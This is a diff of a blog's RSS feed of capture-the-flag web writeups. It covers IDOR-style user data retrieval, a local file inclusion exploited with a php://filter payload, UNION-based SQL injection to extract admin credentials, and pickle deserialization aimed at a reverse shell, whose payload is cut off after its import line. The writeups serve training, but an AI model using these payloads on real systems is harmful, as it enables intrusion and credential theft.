@@ -1,17 +1,846 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>Web on Sum Ting Wong&#39;s Blog</title>
-        <link>https://qiaonpc.github.io/tags/web/</link>
-        <description>Recent content in Web on Sum Ting Wong&#39;s Blog</description>
+        <title>Web on </title>
+        <link>http://localhost:1313/tags/web/</link>
+        <description>Recent content in Web on </description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 09 Mar 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://qiaonpc.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 08 Sep 2024 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/tags/web/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>IPORTE</title>
+        <link>http://localhost:1313/post/iporte/</link>
+        <pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/post/iporte/</guid>
+        <description>&lt;h1 id=&#34;iporte-ctf-challenge-writeup&#34;&gt;IPORTE CTF Challenge Writeup
+&lt;/h1&gt;&lt;h2 id=&#34;challenge-information&#34;&gt;Challenge Information
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Name&lt;/strong&gt;: IPORTE&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Points&lt;/strong&gt;: 1&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Category&lt;/strong&gt;: Web&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Objective&lt;/strong&gt;: Exploit a vulnerability to retrieve information about other users, including the flag.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution
+&lt;/h2&gt;&lt;p&gt;To solve the &amp;ldquo;IPORTE&amp;rdquo; challenge, follow these steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Initial Exploration&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;The challenge page provides functionality to register and log in.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Register an account to obtain a base64 encoded string.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/iporte/register%20for%20acc.png&#34;
+	width=&#34;985&#34;
+	height=&#34;496&#34;
+	srcset=&#34;http://localhost:1313/post/iporte/register%20for%20acc_hu6b581fb54e7b051a55046e8d170fa153_25521_480x0_resize_box_3.png 480w, http://localhost:1313/post/iporte/register%20for%20acc_hu6b581fb54e7b051a55046e8d170fa153_25521_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Register for Account&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;476px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Decoding the Base64 String&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Decode the base64 encoded string received after registration.&lt;/li&gt;
+&lt;li&gt;The decoded string reveals your username and the registration date.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Exploiting the Information Retrieval Functionality&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Note that it’s possible to retrieve information about other users by using their base64 encoded strings.&lt;/li&gt;
+&lt;li&gt;You can send a POST request with a base64 encoded string to get details of other users.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Retrieving the Admin Information&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Obtain the base64 encoded string for the admin user.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Send a POST request with this encoded string to get the admin&amp;rsquo;s details.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/iporte/get%20admin%20base64%20string.png&#34;
+	width=&#34;1349&#34;
+	height=&#34;671&#34;
+	srcset=&#34;http://localhost:1313/post/iporte/get%20admin%20base64%20string_hu3e3fa270613a9075feff8b988eacb3f7_35240_480x0_resize_box_3.png 480w, http://localhost:1313/post/iporte/get%20admin%20base64%20string_hu3e3fa270613a9075feff8b988eacb3f7_35240_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Admin String&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;201&#34;
+		data-flex-basis=&#34;482px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Getting the Flag&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Retrieve the flag from the admin&amp;rsquo;s information or as part of the response to the request.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/iporte/flag.png&#34;
+	width=&#34;1306&#34;
+	height=&#34;458&#34;
+	srcset=&#34;http://localhost:1313/post/iporte/flag_huca19786772bcb5d341323288f6379590_75588_480x0_resize_box_3.png 480w, http://localhost:1313/post/iporte/flag_huca19786772bcb5d341323288f6379590_75588_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;285&#34;
+		data-flex-basis=&#34;684px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>Kakegura Secret</title>
+        <link>http://localhost:1313/post/kakegura-secret/</link>
+        <pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/post/kakegura-secret/</guid>
+        <description>&lt;h1 id=&#34;kakegura-secret-ctf-challenge-writeup&#34;&gt;Kakegura Secret CTF Challenge Writeup
+&lt;/h1&gt;&lt;h2 id=&#34;challenge-information&#34;&gt;Challenge Information
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Name&lt;/strong&gt;: Kakegura Secret&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Points&lt;/strong&gt;: 1&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Category&lt;/strong&gt;: Web&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Objective&lt;/strong&gt;: Exploit a Local File Inclusion (LFI) vulnerability to retrieve the flag.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution
+&lt;/h2&gt;&lt;p&gt;To solve the &amp;ldquo;Kakegura Secret&amp;rdquo; challenge, follow these steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Initial Exploration&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;The website appears to be a PHP-based application.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Clicking on the &amp;ldquo;Flag&amp;rdquo; page does not display the flag directly.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/kakegura-secret/flag%20defnied.png&#34;
+	width=&#34;951&#34;
+	height=&#34;271&#34;
+	srcset=&#34;http://localhost:1313/post/kakegura-secret/flag%20defnied_hufdc796fd020784bd321285376a6495fc_23448_480x0_resize_box_3.png 480w, http://localhost:1313/post/kakegura-secret/flag%20defnied_hufdc796fd020784bd321285376a6495fc_23448_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Flag Denied&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;350&#34;
+		data-flex-basis=&#34;842px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Identifying the Vulnerability&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;By clicking around the website, you can suspect the presence of a Local File Inclusion (LFI) vulnerability, possibly involving PHP filters.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The way the page renders suggests that files may be included dynamically.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/kakegura-secret/potential%20lfi.png&#34;
+	width=&#34;874&#34;
+	height=&#34;395&#34;
+	srcset=&#34;http://localhost:1313/post/kakegura-secret/potential%20lfi_hua73ba821c124fd04027a666ce2cecefa_76673_480x0_resize_box_3.png 480w, http://localhost:1313/post/kakegura-secret/potential%20lfi_hua73ba821c124fd04027a666ce2cecefa_76673_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Potential LFI&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;221&#34;
+		data-flex-basis=&#34;531px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Exploiting LFI with PHP Filters&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Use PHP filters to exploit the LFI vulnerability to read sensitive files.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Example payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;page&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;convert&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;By leveraging the filter to base64 encode the content of files, retrieve the contents of important files, including the one containing the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/kakegura-secret/output%20of%20php%20filter.png&#34;
+	width=&#34;1683&#34;
+	height=&#34;502&#34;
+	srcset=&#34;http://localhost:1313/post/kakegura-secret/output%20of%20php%20filter_huc0926598aa7285f729bb5d7fef5516d6_116376_480x0_resize_box_3.png 480w, http://localhost:1313/post/kakegura-secret/output%20of%20php%20filter_huc0926598aa7285f729bb5d7fef5516d6_116376_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Output of PHP Filter&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;335&#34;
+		data-flex-basis=&#34;804px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Flag Retrieval&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Successfully exploit the LFI to access the flag and decode it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/kakegura-secret/flag.png&#34;
+	width=&#34;1311&#34;
+	height=&#34;668&#34;
+	srcset=&#34;http://localhost:1313/post/kakegura-secret/flag_hu760c13288a1c7fe359fc10560a88304f_175640_480x0_resize_box_3.png 480w, http://localhost:1313/post/kakegura-secret/flag_hu760c13288a1c7fe359fc10560a88304f_175640_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;196&#34;
+		data-flex-basis=&#34;471px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>My First Blog</title>
+        <link>http://localhost:1313/post/my-first-blog/</link>
+        <pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/post/my-first-blog/</guid>
+        <description>&lt;h1 id=&#34;my-first-blog-ctf-challenge-writeup&#34;&gt;My First Blog CTF Challenge Writeup
+&lt;/h1&gt;&lt;h2 id=&#34;challenge-information&#34;&gt;Challenge Information
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Name&lt;/strong&gt;: My First Blog&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Points&lt;/strong&gt;: 1&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Category&lt;/strong&gt;: Web&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Objective&lt;/strong&gt;: Exploit an SQL injection vulnerability to retrieve admin credentials and obtain the flag.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution
+&lt;/h2&gt;&lt;p&gt;To solve the &amp;ldquo;My First Blog&amp;rdquo; challenge, follow these steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Identifying the Vulnerability&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The challenge hints at an SQL injection vulnerability.&lt;/li&gt;
+&lt;li&gt;Direct use of SQLmap is not possible, so manual enumeration is necessary.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Initial Enumeration&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Perform basic enumeration to identify potential SQL errors and found that it might be an SQLite database&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/my-first-blog/potential%20sqlite.png&#34;
+	width=&#34;1248&#34;
+	height=&#34;370&#34;
+	srcset=&#34;http://localhost:1313/post/my-first-blog/potential%20sqlite_hu1f266b76824c838c35227ddd7931513f_52486_480x0_resize_box_3.png 480w, http://localhost:1313/post/my-first-blog/potential%20sqlite_hu1f266b76824c838c35227ddd7931513f_52486_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Potential SQLite&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;337&#34;
+		data-flex-basis=&#34;809px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SQL Injection Exploration&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Test for SQL injection vulnerabilities by injecting payloads into input fields or URL parameters.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use basic UNION-based SQL injection techniques to determine the number of columns in the SQL queries.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/my-first-blog/enumerate%20the%20columns.png&#34;
+	width=&#34;1589&#34;
+	height=&#34;404&#34;
+	srcset=&#34;http://localhost:1313/post/my-first-blog/enumerate%20the%20columns_hu2fa1dbeaf9d04526d3f140b65dbf7799_89920_480x0_resize_box_3.png 480w, http://localhost:1313/post/my-first-blog/enumerate%20the%20columns_hu2fa1dbeaf9d04526d3f140b65dbf7799_89920_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Enumerate Columns&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;393&#34;
+		data-flex-basis=&#34;943px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/my-first-blog/found%20number%20of%20columhns.png&#34;
+	width=&#34;1608&#34;
+	height=&#34;507&#34;
+	srcset=&#34;http://localhost:1313/post/my-first-blog/found%20number%20of%20columhns_hu89c00f66d7c4f861c6ae68bab11faec2_92614_480x0_resize_box_3.png 480w, http://localhost:1313/post/my-first-blog/found%20number%20of%20columhns_hu89c00f66d7c4f861c6ae68bab11faec2_92614_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Found Number of Columns&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;317&#34;
+		data-flex-basis=&#34;761px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Finding Tables&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Once the number of columns is identified, proceed with UNION-based queries to list tables.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Identify a table named &lt;code&gt;users&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/my-first-blog/find%20table.png&#34;
+	width=&#34;1595&#34;
+	height=&#34;505&#34;
+	srcset=&#34;http://localhost:1313/post/my-first-blog/find%20table_hu895923f192f613c5fe571045d0df3f2d_119606_480x0_resize_box_3.png 480w, http://localhost:1313/post/my-first-blog/find%20table_hu895923f192f613c5fe571045d0df3f2d_119606_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Found Table&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;315&#34;
+		data-flex-basis=&#34;758px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Enumerating Columns&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Enumerate the columns in the &lt;code&gt;users&lt;/code&gt; table to find useful information.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Identify columns such as &lt;code&gt;id&lt;/code&gt;, &lt;code&gt;username&lt;/code&gt;, &lt;code&gt;password&lt;/code&gt;, &lt;code&gt;email&lt;/code&gt;, and &lt;code&gt;role&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/my-first-blog/find%20columns.png&#34;
+	width=&#34;1441&#34;
+	height=&#34;458&#34;
+	srcset=&#34;http://localhost:1313/post/my-first-blog/find%20columns_hudd8680ead52b82e6399963bed8aa6148_73599_480x0_resize_box_3.png 480w, http://localhost:1313/post/my-first-blog/find%20columns_hudd8680ead52b82e6399963bed8aa6148_73599_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Found Columns&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;314&#34;
+		data-flex-basis=&#34;755px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Retrieving Admin Credentials&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Extract the credentials of the admin user from the &lt;code&gt;users&lt;/code&gt; table.&lt;/li&gt;
+&lt;li&gt;Use SQL injection to retrieve and view the admin credentials.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Flag Retrieval&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Submit the retrieved admin credentials as the flag in the format &lt;code&gt;FSIIECTF{XXXXXXXXXX}&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/my-first-blog/found%20flag.png&#34;
+	width=&#34;1629&#34;
+	height=&#34;647&#34;
+	srcset=&#34;http://localhost:1313/post/my-first-blog/found%20flag_hu8603e4d8fd9d5bc015d93dd3d0b7f898_151634_480x0_resize_box_3.png 480w, http://localhost:1313/post/my-first-blog/found%20flag_hu8603e4d8fd9d5bc015d93dd3d0b7f898_151634_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;251&#34;
+		data-flex-basis=&#34;604px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>The Two Step</title>
+        <link>http://localhost:1313/post/the-two-step/</link>
+        <pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/post/the-two-step/</guid>
+        <description>&lt;h1 id=&#34;the-two-step-ctf-challenge-writeup&#34;&gt;The Two Step CTF Challenge Writeup
+&lt;/h1&gt;&lt;h2 id=&#34;challenge-information&#34;&gt;Challenge Information
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Name&lt;/strong&gt;: The Two Step&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Points&lt;/strong&gt;: 1&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Category&lt;/strong&gt;: Web&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Objective&lt;/strong&gt;: Exploit insecure deserialization to gain shell access and retrieve the flag.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution
+&lt;/h2&gt;&lt;p&gt;To solve the &amp;ldquo;The Two Step&amp;rdquo; challenge, follow these steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Initial Analysis&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Upon visiting the website, the initial impression might be a redirect vulnerability, but further inspection shows it&amp;rsquo;s not the case.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/the-two-step/potential%20redirect%20vuln.png&#34;
+	width=&#34;1709&#34;
+	height=&#34;860&#34;
+	srcset=&#34;http://localhost:1313/post/the-two-step/potential%20redirect%20vuln_hu534c032bc4226b59db0c382518263bf5_90177_480x0_resize_box_3.png 480w, http://localhost:1313/post/the-two-step/potential%20redirect%20vuln_hu534c032bc4226b59db0c382518263bf5_90177_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Potential Redirect Vuln&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;476px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Identifying Insecure Deserialization&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Inspect the source code and identify that it uses Python&amp;rsquo;s pickle module for deserialization.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Note that deserialization is insecurely handled, allowing for arbitrary code execution if exploited correctly.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/the-two-step/source%20code.png&#34;
+	width=&#34;1478&#34;
+	height=&#34;856&#34;
+	srcset=&#34;http://localhost:1313/post/the-two-step/source%20code_huc67a06df4f08313558ae2e3033596545_137544_480x0_resize_box_3.png 480w, http://localhost:1313/post/the-two-step/source%20code_huc67a06df4f08313558ae2e3033596545_137544_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Source COde&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;172&#34;
+		data-flex-basis=&#34;414px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Crafting the Payload&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Attempt to use standard pickle payloads. Initial attempts may only return numbers or unintended outputs.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/the-two-step/tried%20simple%20pickle%20payload.png&#34;
+	width=&#34;1543&#34;
+	height=&#34;595&#34;
+	srcset=&#34;http://localhost:1313/post/the-two-step/tried%20simple%20pickle%20payload_hu04ea316c70be6a31cec057843ad2dbb6_87585_480x0_resize_box_3.png 480w, http://localhost:1313/post/the-two-step/tried%20simple%20pickle%20payload_hu04ea316c70be6a31cec057843ad2dbb6_87585_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Simple Pickle Payload&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;259&#34;
+		data-flex-basis=&#34;622px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Instead, craft a payload designed to spawn a shell. Initially tried a simple &lt;code&gt;nc&lt;/code&gt; shell, but it didnt work, maybe &lt;code&gt;nc&lt;/code&gt; is blocked&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Using an Alternative Shell&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Since &lt;code&gt;nc&lt;/code&gt; may not be executable, use a Python-based reverse shell to establish a connection.&lt;/li&gt;
+&lt;li&gt;Example Python reverse shell payload:
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pickle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
